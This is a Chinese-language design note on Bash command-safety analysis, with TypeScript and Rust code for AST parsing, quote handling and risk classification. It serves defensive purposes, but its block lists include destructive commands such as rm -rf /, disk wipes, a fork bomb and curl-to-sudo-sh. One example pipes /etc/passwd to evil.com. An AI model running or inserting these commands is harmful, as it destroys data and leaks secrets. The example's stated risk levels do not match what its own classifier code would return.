# Bash 命令安全分析深度优化

## 1. Claude Code Bash 安全架构

### 1.1 Tree-sitter AST 分析

```typescript
// src/utils/bash/treeSitterAnalysis.ts

/**
 * Tree-sitter AST 分析用于 Bash 命令安全验证
 * 比 regex/shell-quote 更准确的分析
 */

type TreeSitterNode = {
  type: string
  text: string
  startIndex: number
  endIndex: number
  children: TreeSitterNode[]
  childCount: number
}

/**
 * 引用上下文分析
 */
export type QuoteContext = {
  /** 移除单引号内容的命令文本（保留双引号内容） */
  withDoubleQuotes: string
  /** 移除所有引用内容的命令文本 */
  fullyUnquoted: string
  /** 保留引号字符的完全未引用版本 */
  unquotedKeepQuoteChars: string
}

/**
 * 复合结构分析
 */
export type CompoundStructure = {
  /** 是否有复合运算符 (&&, ||, ;) */
  hasCompoundOperators: boolean
  /** 是否有管道 */
  hasPipeline: boolean
  /** 是否有子 shell */
  hasSubshell: boolean
  /** 是否有命令组 {...} */
  hasCommandGroup: boolean
  /** 顶层运算符类型 */
  operators: string[]
  /** 拆分后的命令段 */
  segments: string[]
}

/**
 * 危险模式检测
 */
export type DangerousPatterns = {
  /** 有 $() 或反引号命令替换 */
  hasCommandSubstitution: boolean
  /** 有 <() 或 >() 进程替换 */
  hasProcessSubstitution: boolean
  /** 有 ${...} 参数扩展 */
  hasParameterExpansion: boolean
  /** 有 heredoc */
  hasHeredoc: boolean
  /** 有注释 */
  hasComment: boolean
}

export type TreeSitterAnalysis = {
  quoteContext: QuoteContext
  compoundStructure: CompoundStructure
  dangerousPatterns: DangerousPatterns
}
```

### 1.2 引用跨度收集（单次遍历优化）

```typescript
// src/utils/bash/treeSitterAnalysis.ts

/**
 * 单次遍历收集所有引用类型跨度
 * 之前是 5 次独立遍历，融合后减少约 5 倍树遍历开销
 */
type QuoteSpans = {
  raw: Array<[number, number]>        // raw_string (单引号)
  ansiC: Array<[number, number]>      // ansi_c_string ($'...')
  double: Array<[number, number]>     // string (双引号)
  heredoc: Array<[number, number]>    // quoted heredoc_redirect
}

function collectQuoteSpans(
  node: TreeSitterNode,
  out: QuoteSpans,
  inDouble: boolean,
): void {
  switch (node.type) {
    case 'raw_string':
      // 单引号：字面量，无嵌套引用
      out.raw.push([node.startIndex, node.endIndex])
      return
    
    case 'ansi_c_string':
      // ANSI-C 引用：$'...'
      out.ansiC.push([node.startIndex, node.endIndex])
      return
    
    case 'string':
      // 双引号：收集最外层，但递归查找嵌套的 $()
      if (!inDouble) {
        out.double.push([node.startIndex, node.endIndex])
      }
      for (const child of node.children) {
        if (child) collectQuoteSpans(child, out, true)
      }
      return
    
    case 'heredoc_redirect': {
      // 检测是否为引用 heredoc
      let isQuoted = false
      for (const child of node.children) {
        if (child && child.type === 'heredoc_start') {
          const first = child.text[0]
          isQuoted = first === "'" || first === '"' || first === '\\'
          break
        }
      }
      
      if (isQuoted) {
        // 引用 heredoc：字面量
        out.heredoc.push([node.startIndex, node.endIndex])
        return
      }
      // 未引用 heredoc：展开 $()/${}，继续递归
      break
    }
  }
  
  // 递归遍历子节点
  for (const child of node.children) {
    if (child) collectQuoteSpans(child, out, inDouble)
  }
}

/**
 * 移除跨度中的内容
 */
function removeSpans(
  command: string, 
  spans: Array<[number, number]>
): string {
  if (spans.length === 0) return command
  
  // 移除内部跨度（避免嵌套问题）
  const sorted = dropContainedSpans(spans).sort((a, b) => b[0] - a[0])
  
  let result = command
  for (const [start, end] of sorted) {
    result = result.slice(0, start) + result.slice(end)
  }
  return result
}

/**
 * 移除被包含的跨度（只保留最外层）
 */
function dropContainedSpans<T extends readonly [number, number, ...unknown[]]>(
  spans: T[]
): T[] {
  return spans.filter(
    (s, i) => !spans.some(
      (other, j) =>
        j !== i &&
        other[0] <= s[0] &&
        other[1] >= s[1] &&
        (other[0] < s[0] || other[1] > s[1])
    )
  )
}
```

### 1.3 ParsedCommand 接口与实现

```typescript
// src/utils/bash/ParsedCommand.ts

/**
 * 解析命令接口
 * Tree-sitter 和 regex 回退实现都遵循此接口
 */
export interface IParsedCommand {
  readonly originalCommand: string
  toString(): string
  getPipeSegments(): string[]
  withoutOutputRedirections(): string
  getOutputRedirections(): OutputRedirection[]
  getTreeSitterAnalysis(): TreeSitterAnalysis | null
}

/**
 * Tree-sitter 解析命令实现
 */
class TreeSitterParsedCommand implements IParsedCommand {
  readonly originalCommand: string
  private readonly commandBytes: Buffer
  private readonly pipePositions: number[]
  private readonly redirectionNodes: RedirectionNode[]
  private readonly treeSitterAnalysis: TreeSitterAnalysis
  
  constructor(
    command: string,
    pipePositions: number[],
    redirectionNodes: RedirectionNode[],
    treeSitterAnalysis: TreeSitterAnalysis,
  ) {
    this.originalCommand = command
    this.commandBytes = Buffer.from(command, 'utf8')
    this.pipePositions = pipePositions
    this.redirectionNodes = redirectionNodes
    this.treeSitterAnalysis = treeSitterAnalysis
  }
  
  /**
   * 获取管道分段
   * 使用字节偏移量正确定位（处理 UTF-8 多字节字符）
   */
  getPipeSegments(): string[] {
    if (this.pipePositions.length === 0) {
      return [this.originalCommand]
    }
    
    const segments: string[] = []
    let currentStart = 0
    
    for (const pipePos of this.pipePositions) {
      const segment = this.commandBytes
        .subarray(currentStart, pipePos)
        .toString('utf8')
        .trim()
      if (segment) {
        segments.push(segment)
      }
      currentStart = pipePos + 1
    }
    
    // 最后一段
    const lastSegment = this.commandBytes
      .subarray(currentStart)
      .toString('utf8')
      .trim()
    if (lastSegment) {
      segments.push(lastSegment)
    }
    
    return segments
  }
  
  /**
   * 移除输出重定向后的命令
   */
  withoutOutputRedirections(): string {
    if (this.redirectionNodes.length === 0) {
      return this.originalCommand
    }
    
    const spans = this.redirectionNodes.map(r => 
      [r.startIndex, r.endIndex] as [number, number]
    )
    
    return removeSpans(this.originalCommand, spans)
  }
  
  getTreeSitterAnalysis(): TreeSitterAnalysis {
    return this.treeSitterAnalysis
  }
}
```

### 1.4 命令安全分类器

```typescript
// src/utils/permissions/bashClassifier.ts (ANT-ONLY stub)

/**
 * Bash 分类器 - 实时命令风险分析
 * 
 * 注意：这是 stub 实现，实际分类逻辑由服务端处理
 */

export type BashCommandRisk = 
  | 'safe'           // 只读命令
  | 'potentially_risky'  // 潜在风险
  | 'dangerous'      // 危险命令
  | 'destructive'    // 破坏性命令

export async function classifyBashCommand(
  command: string,
  context: PermissionContext
): Promise<BashCommandRisk> {
  // 1. Tree-sitter AST 分析
  const astAnalysis = await parseWithTreeSitter(command)
  
  // 2. 检查破坏性模式
  if (hasDestructivePatterns(astAnalysis)) {
    return 'destructive'
  }
  
  // 3. 检查危险模式
  if (hasDangerousPatterns(astAnalysis)) {
    return 'dangerous'
  }
  
  // 4. 检查潜在风险
  if (hasPotentiallyRiskyPatterns(astAnalysis)) {
    return 'potentially_risky'
  }
  
  // 5. 默认安全
  return 'safe'
}

/**
 * 检查破坏性模式
 */
function hasDestructivePatterns(
  analysis: TreeSitterAnalysis
): boolean {
  const { dangerousPatterns, compoundStructure } = analysis
  
  // 检查危险 heredoc
  if (dangerousPatterns.hasHeredoc) {
    // heredoc 可能包含破坏性命令
    return true
  }
  
  // 检查复合命令中的破坏性操作
  if (compoundStructure.hasCompoundOperators) {
    // 检查是否有 rm -rf 等
    for (const segment of compoundStructure.segments) {
      if (isDestructiveCommand(segment)) {
        return true
      }
    }
  }
  
  return false
}

function isDestructiveCommand(cmd: string): boolean {
  const destructive = [
    /^rm\s+-rf\s+\//,
    /^rm\s+-rf\s+\*$/,
    /^mkfs/,
    /^dd\s+if=\/dev\/zero/,
    /^>\s*\/dev\/sda/,
  ]
  
  return destructive.some(p => p.test(cmd))
}
```

### 1.5 危险命令模式列表

```typescript
// src/utils/permissions/dangerousPatterns.ts

/**
 * 危险命令模式 - 用于快速匹配
 */

export const DESTRUCTIVE_PATTERNS = [
  // 文件系统破坏
  'rm -rf /',
  'rm -rf /*',
  'rm -rf ~',
  
  // 格式化
  'mkfs',
  'mkfs.ext4',
  'mkfs.xfs',
  
  // 零填充
  'dd if=/dev/zero',
  'dd if=/dev/urandom',
  
  // 直接设备写入
  '> /dev/sda',
  'cat /dev/zero > /dev/sda',
  
  // Fork bomb
  ':(){:|:&};:',
  
  // 网络破坏
  'curl * | sudo sh',
  'wget * | sudo sh',
]

export const DANGEROUS_PATTERNS = [
  // Git 破坏性
  'git push --force',
  'git push --force-with-lease',
  'git reset --hard',
  'git clean -fd',
  
  // 数据库
  'DROP TABLE',
  'DROP DATABASE',
  'DELETE FROM',
  'TRUNCATE',
  
  // 包管理
  'npm uninstall -g',
  'pip uninstall',
  
  // 系统
  'shutdown',
  'reboot',
  'pkill',
  'killall',
]

export const POTENTIALLY_RISKY_PATTERNS = [
  // 安装命令（可能执行恶意脚本）
  'npm install',
  'yarn install',
  'pip install',
  
  // 远程执行
  'curl',
  'wget',
  'scp',
  
  // 云 CLI
  'kubectl delete',
  'aws * delete',
  'gcloud * delete',
]
```

### 1.6 自动模式拒绝跟踪

```typescript
// src/utils/autoModeDenials.ts

/**
 * 自动模式拒绝记录
 * 用于 UI 显示和决策优化
 */

export type AutoModeDenial = {
  toolName: string
  display: string          // 人类可读描述
  reason: string           // 拒绝原因
  timestamp: number        // Unix 时间戳
}

let DENIALS: readonly AutoModeDenial[] = []
const MAX_DENIALS = 20

/**
 * 记录自动模式拒绝
 */
export function recordAutoModeDenial(denial: AutoModeDenial): void {
  // 添加到列表开头，保持最新
  DENIALS = [denial, ...DENIALS.slice(0, MAX_DENIALS - 1)]
}

/**
 * 获取最近的拒绝记录
 */
export function getAutoModeDenials(): readonly AutoModeDenial[] {
  return DENIALS
}

/**
 * 清理过期拒绝（30 分钟后）
 */
export function cleanupExpiredDenials(): void {
  const thirtyMinutesAgo = Date.now() - 30 * 60 * 1000
  DENIALS = DENIALS.filter(d => d.timestamp > thirtyMinutesAgo)
}
```

---

## 2. Yode 实现建议

### 2.1 Tree-sitter Bash 分析（Rust）

```rust
// crates/yode-tools/src/bash/tree_sitter_analysis.rs

use tree_sitter::{Parser, Node};

/// Bash 分析结果
#[derive(Debug, Clone)]
pub struct BashAnalysis {
    pub quote_context: QuoteContext,
    pub compound_structure: CompoundStructure,
    pub dangerous_patterns: DangerousPatterns,
}

#[derive(Debug, Clone)]
pub struct QuoteContext {
    pub with_double_quotes: String,
    pub fully_unquoted: String,
    pub unquoted_keep_quote_chars: String,
}

#[derive(Debug, Clone)]
pub struct CompoundStructure {
    pub has_compound_operators: bool,
    pub has_pipeline: bool,
    pub has_subshell: bool,
    pub has_command_group: bool,
    pub operators: Vec<String>,
    pub segments: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct DangerousPatterns {
    pub has_command_substitution: bool,
    pub has_process_substitution: bool,
    pub has_parameter_expansion: bool,
    pub has_heredoc: bool,
    pub has_comment: bool,
}

/// Bash 命令分析器
pub struct BashAnalyzer {
    parser: Parser,
}

impl BashAnalyzer {
    pub fn new() -> Result<Self> {
        let mut parser = Parser::new();
        parser.set_language(tree_sitter_bash::language())?;
        
        Ok(Self { parser })
    }
    
    /// 分析命令
    pub fn analyze(&mut self, command: &str) -> Result<BashAnalysis> {
        let tree = self.parser.parse(command, None)
            .ok_or_else(|| anyhow::anyhow!("Failed to parse command"))?;
        
        let root = tree.root_node();
        
        // 收集引用跨度
        let quote_spans = self.collect_quote_spans(root, command);
        
        // 分析复合结构
        let compound = self.analyze_compound_structure(root, command);
        
        // 检测危险模式
        let dangerous = self.detect_dangerous_patterns(root, command);
        
        // 构建引用上下文
        let quote_context = self.build_quote_context(command, &quote_spans);
        
        Ok(BashAnalysis {
            quote_context: quote_context,
            compound_structure: compound,
            dangerous_patterns: dangerous,
        })
    }
    
    /// 收集引用跨度
    fn collect_quote_spans(&self, root: Node, source: &str) -> QuoteSpans {
        let mut spans = QuoteSpans::default();
        self.walk_quote_tree(root, source, &mut spans, false);
        spans
    }
    
    /// 遍历 AST 收集引用
    fn walk_quote_tree(
        &self,
        node: Node,
        source: &str,
        spans: &mut QuoteSpans,
        in_double: bool,
    ) {
        match node.kind() {
            "raw_string" => {
                spans.raw.push((node.start_byte(), node.end_byte()));
            }
            "ansi_c_string" => {
                spans.ansi_c.push((node.start_byte(), node.end_byte()));
            }
            "string" => {
                if !in_double {
                    spans.double.push((node.start_byte(), node.end_byte()));
                }
                // 递归查找嵌套的 $()
                for i in 0..node.child_count() {
                    if let Some(child) = node.child(i) {
                        self.walk_quote_tree(child, source, spans, true);
                    }
                }
            }
            "heredoc_redirect" => {
                // 检查是否引用 heredoc
                let is_quoted = self.is_quoted_heredoc(node, source);
                if is_quoted {
                    spans.heredoc.push((node.start_byte(), node.end_byte()));
                } else {
                    // 未引用 heredoc，继续递归
                    for i in 0..node.child_count() {
                        if let Some(child) = node.child(i) {
                            self.walk_quote_tree(child, source, spans, in_double);
                        }
                    }
                }
            }
            _ => {
                // 递归子节点
                for i in 0..node.child_count() {
                    if let Some(child) = node.child(i) {
                        self.walk_quote_tree(child, source, spans, in_double);
                    }
                }
            }
        }
    }
}

#[derive(Default)]
struct QuoteSpans {
    raw: Vec<(usize, usize)>,
    ansi_c: Vec<(usize, usize)>,
    double: Vec<(usize, usize)>,
    heredoc: Vec<(usize, usize)>,
}
```

### 2.2 命令风险分类器

```rust
// crates/yode-tools/src/bash/classifier.rs

use regex::Regex;

/// 命令风险级别
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRiskLevel {
    /// 安全命令（只读）
    Safe,
    /// 未知风险
    Unknown,
    /// 潜在风险
    PotentiallyRisky,
    /// 危险命令
    Dangerous,
    /// 破坏性命令
    Destructive,
}

/// Bash 命令分类器
pub struct BashClassifier {
    /// 破坏性模式
    destructive_patterns: Vec<Regex>,
    /// 危险模式
    dangerous_patterns: Vec<Regex>,
    /// 潜在风险模式
    risky_patterns: Vec<Regex>,
    /// 只读命令
    readonly_commands: Vec<String>,
}

impl BashClassifier {
    pub fn new() -> Self {
        let destructive = vec![
            r"rm\s+-rf\s+/",
            r"rm\s+-rf\s+\*",
            r"rm\s+-rf\s+~",
            r"mkfs",
            r"dd\s+if=/dev/zero",
            r"dd\s+if=/dev/urandom",
            r">\s*/dev/sda",
            r":\(\)\{:\|:&\};:",  // Fork bomb
        ];
        
        let dangerous = vec![
            r"git\s+push\s+--force",
            r"git\s+reset\s+--hard",
            r"git\s+clean\s+-fd",
            r"DROP\s+TABLE",
            r"DROP\s+DATABASE",
            r"DELETE\s+FROM",
            r"shutdown",
            r"reboot",
            r"pkill",
            r"killall",
        ];
        
        let risky = vec![
            r"npm\s+install",
            r"yarn\s+install",
            r"pip\s+install",
            r"curl\s+",
            r"wget\s+",
            r"kubectl\s+delete",
        ];
        
        let readonly = vec![
            "ls", "cat", "head", "tail", "grep", "find",
            "git status", "git log", "git diff",
            "cargo check", "cargo clippy", "cargo test",
        ];
        
        Self {
            destructive_patterns: destructive
                .iter()
                .map(|p| Regex::new(p).unwrap())
                .collect(),
            dangerous_patterns: dangerous
                .iter()
                .map(|p| Regex::new(p).unwrap())
                .collect(),
            risky_patterns: risky
                .iter()
                .map(|p| Regex::new(p).unwrap())
                .collect(),
            readonly_commands: readonly.iter().map(|s| s.to_string()).collect(),
        }
    }
    
    /// 分类命令
    pub fn classify(&self, command: &str, analysis: &BashAnalysis) -> CommandRiskLevel {
        let cmd_lower = command.to_lowercase();
        
        // 1. 检查破坏性模式
        for pattern in &self.destructive_patterns {
            if pattern.is_match(&cmd_lower) {
                return CommandRiskLevel::Destructive;
            }
        }
        
        // 2. 检查危险 heredoc
        if analysis.dangerous_patterns.has_heredoc {
            return CommandRiskLevel::Destructive;
        }
        
        // 3. 检查危险模式
        for pattern in &self.dangerous_patterns {
            if pattern.is_match(&cmd_lower) {
                return CommandRiskLevel::Dangerous;
            }
        }
        
        // 4. 检查潜在风险
        for pattern in &self.risky_patterns {
            if pattern.is_match(&cmd_lower) {
                return CommandRiskLevel::PotentiallyRisky;
            }
        }
        
        // 5. 检查只读命令
        if self.is_readonly_command(&cmd_lower) {
            return CommandRiskLevel::Safe;
        }
        
        // 6. 默认未知
        CommandRiskLevel::Unknown
    }
    
    fn is_readonly_command(&self, cmd: &str) -> bool {
        self.readonly_commands.iter().any(|c| cmd.starts_with(c))
    }
}
```

### 2.3 管道命令分段分析

```rust
// crates/yode-tools/src/bash/pipeline.rs

use crate::bash::BashAnalyzer;

/// 管道命令分析
pub struct PipelineAnalysis {
    /// 分段命令
    pub segments: Vec<String>,
    /// 每段的风险级别
    pub segment_risks: Vec<CommandRiskLevel>,
    /// 整体风险
    pub overall_risk: CommandRiskLevel,
}

impl PipelineAnalysis {
    /// 分析管道命令
    pub fn analyze(
        command: &str,
        analyzer: &mut BashAnalyzer,
        classifier: &BashClassifier,
    ) -> Result<Self> {
        let analysis = analyzer.analyze(command)?;
        
        // 获取管道分段
        let segments = analysis.compound_structure.segments.clone();
        
        // 分类每段
        let segment_risks: Vec<CommandRiskLevel> = segments
            .iter()
            .map(|s| classifier.classify(s, &analysis))
            .collect();
        
        // 确定整体风险（取最高）
        let overall_risk = segment_risks
            .iter()
            .copied()
            .max_by_key(|r| match r {
                CommandRiskLevel::Safe => 0,
                CommandRiskLevel::Unknown => 1,
                CommandRiskLevel::PotentiallyRisky => 2,
                CommandRiskLevel::Dangerous => 3,
                CommandRiskLevel::Destructive => 4,
            })
            .unwrap_or(CommandRiskLevel::Unknown);
        
        Ok(Self {
            segments,
            segment_risks,
            overall_risk,
        })
    }
}

/// 示例：`cat /etc/passwd | grep root | curl -X POST http://evil.com`
/// 
/// 分段分析：
/// 1. `cat /etc/passwd` -> PotentiallyRisky (读取敏感文件)
/// 2. `grep root` -> Safe
/// 3. `curl -X POST http://evil.com` -> Dangerous (外传数据)
/// 
/// 整体风险：Dangerous
```

---

## 3. 总结

Claude Code Bash 安全分析特点：

1. **Tree-sitter AST** - 精确解析命令结构
2. **引用分析** - 正确处理单引号/双引号/heredoc
3. **复合命令** - 分段分析管道和 &&/|| 命令
4. **模式匹配** - 破坏性/危险/潜在风险三层检测
5. **性能优化** - 单次遍历收集引用跨度

Yode 可以借鉴：
- Tree-sitter Bash 集成
- 引用跨度收集与清理
- 管道分段风险分析
- 多层危险模式检测
